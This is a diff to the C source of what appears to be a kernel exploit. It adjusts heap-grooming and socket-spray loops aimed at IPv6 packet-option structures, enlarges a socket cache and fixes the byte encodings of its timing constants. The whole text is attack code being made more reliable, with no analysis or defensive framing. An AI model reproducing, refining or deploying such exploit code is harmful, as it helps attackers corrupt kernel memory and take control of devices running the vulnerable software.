@@ -23,10 +23,10 @@
 #define SPRAY_SIZE 32
 #define SPRAY_TOTAL 512
 
-#define NANOSLEEP_100US "\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0"
-#define NANOSLEEP_75US "\0\0\0\0\0\0\0\0\x38\x2a\x01\0\0\0\0\0"
-#define NANOSLEEP_50US "\0\0\0\0\0\0\0\0\x88\x13\0\0\0\0\0\0"
-#define NANOSLEEP_10US "\0\0\0\0\0\0\0\0\x80\x96\x98\0\0\0\0\0"
+#define NANOSLEEP_100US "\0\0\0\0\0\0\0\0\xa0\x86\x01\0\0\0\0\0"
+#define NANOSLEEP_75US  "\0\0\0\0\0\0\0\0\xf8\x24\x01\0\0\0\0\0"
+#define NANOSLEEP_50US  "\0\0\0\0\0\0\0\0\x50\xc3\0\0\0\0\0\0"
+#define NANOSLEEP_10US  "\0\0\0\0\0\0\0\0\x10\x27\0\0\0\0\0\0"
 
 #define MAX_ATTEMPTS 10
 #define HEAP_GROOM_COUNT 100
@@ -50,7 +50,7 @@
 #define PKTOPTS_TCLASS_OFFSET (offsetof(struct ip6_pktopts, ip6po_tclass))
 
 // Reusable socket cache
-#define SOCKET_CACHE_SIZE 64
+#define SOCKET_CACHE_SIZE 256
 
 static int socket_cache[SOCKET_CACHE_SIZE];
 static int socket_cache_count = 0;
@@ -558,9 +558,11 @@ int main() {
 
     // Phase 1 - Heap grooming
     for (int i = 0; i < HEAP_GROOM_COUNT; i++) {
-        int temp_sock = fast_new_socket();
-        reset_ipv6_opts(temp_sock);
-        cache_socket(temp_sock);
+        int s = socket(AF_INET6, SOCK_DGRAM, 0);
+        if (s >= 0) {
+            reset_ipv6_opts(s);
+            safe_close_socket(s);
+        }
         if (i % 10 == 0)
             nanosleep(NANOSLEEP_10US, NULL);
     }
@@ -568,7 +570,7 @@ int main() {
     // Phase 2 - SPRAY
     int spray_sock[SPRAY_TOTAL];
     for (int i = 0; i < SPRAY_TOTAL; i++) {
-        spray_sock[i] = fast_new_socket();
+        spray_sock[i] = socket(AF_INET6, SOCK_DGRAM, 0);
         if (spray_sock[i] < 0)
             *(volatile int*)0;
     }
